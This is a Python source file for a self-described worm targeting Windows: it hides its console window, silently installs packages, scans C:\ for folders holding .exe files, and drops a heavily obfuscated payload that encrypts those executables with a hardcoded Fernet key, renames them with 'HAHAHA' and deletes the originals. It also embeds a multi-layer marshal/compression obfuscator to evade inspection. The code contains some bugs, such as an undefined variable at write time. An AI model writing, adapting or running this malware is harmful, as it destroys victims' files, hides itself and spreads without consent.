import os
os.system("pip install pypiwin32 pycryptodome cryptography > /dev/null 2>&1")
import sys
import shutil
import win32con
import win32gui
import random

ROOTDIR = r"C:\\"
THIS_DIR = os.path.dirname(os.path.realpath(__file__))

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                if directory_path != THIS_DIR:
                    try:
                        for f in os.listdir(directory_path):
                            if f.endswith(".exe"):
                                self.target_dir_list.append(directory_path)
                                break
                    except PermissionError:
                        pass

        self.directories_found = True

    def spread(self):
        to_infect = THIS_DIR + "/tmp/to_infect.py"
        to_infect_o = THIS_DIR + "/tmp/to_infect_o.py"

        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
            worm_poli = ""
            times = random.randrange(1, 25)
            for i in range(times):
                num = random.randrange(-sys.maxsize, sys.maxsize)
                worm_poli += "print(" + str(num) + ")\n"

            worm_poli += "\n"
            worm_poli += ENCRYPTOR

            with open("to_infect.py", "w") as tf:
                tf.write(encryptor)

            
            os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100 > /dev/null 2>&1")

            try:
                with open(target + "/hehe.py", "w") as f:
                    with open("to_infect_o.py", "r") as fe:
                        f.write(fe.read())
                os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
                os.remove(target + "/hehe.py")
            except PermissionError:
                pass

    def execute_worm(self):
        if not self.directories_found:
            self.find_directories()

        self.spread()

if __name__ == "__main__":
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)

    FUSCATE = """import os, sys, subprocess, argparse, random, time, marshal, lzma, gzip, bz2, binascii, zlib, requests, tqdm, colorama
PYTHON_VERSION = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
def encode(source:str) -> str:
    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
    if selected_mode is binascii:
        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(binascii.b2a_base64(marshal_encoded))
    return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, selected_mode.compress(marshal_encoded))
def parse_args():
    parser = argparse.ArgumentParser(description='obfuscate python programs'.title())
    parser._optionals.title = "syntax".title()
    parser.add_argument('-i', '--input', type=str, help='input file name'.title(), required=True)
    parser.add_argument('-o', '--output', type=str, help='output file name'.title(), required=True)
    parser.add_argument('-c', '--complexity', type=int,
                        help='complexity of obfuscation. 100 recomended'.title(), required=True)
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    return parser.parse_args()
def main():
    args = parse_args()
    print('\t[+] encoding '.title() + args.input)
    with tqdm.tqdm(total=args.complexity) as pbar:
        with open(args.input) as iput:
            for i in range(args.complexity):
                if i == 0:
                    encoded = encode(source=iput.read())
                else:
                    encoded = encode(source=encoded)
                time.sleep(0.1)
                pbar.update(1)
    with open(args.output, 'w') as output:
        output.write(encoded)
if __name__ == '__main__':
    main()"""

    with open("py_fuscate.py", "w") as f:
        f.write(FUSCATE)

    ENCRYPTOR = """import os
import sys
from cryptography.fernet import Fernet
THIS_DIR = os.path.dirname(os.path.realpath(__file__))
KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='
def encrypt(data, filename):
    f = Fernet(KEY)
    encrypted_data = f.encrypt(data)
    return encrypted_data
if __name__ == "__main__":
    for (_, _, filenames) in os.walk(THIS_DIR):
        break
    for file in filenames:
        if file.endswith(".exe"):
            with open(file, "rb") as f:
                data = f.read()

            destination = file + "HAHAHA"
            with open(destination, "wb") as fd:
                fd.write(encrypt(data, file))
            os.remove(file)"""

    worm = Worm()
    worm.execute_worm()
    os.rmdir("tmp")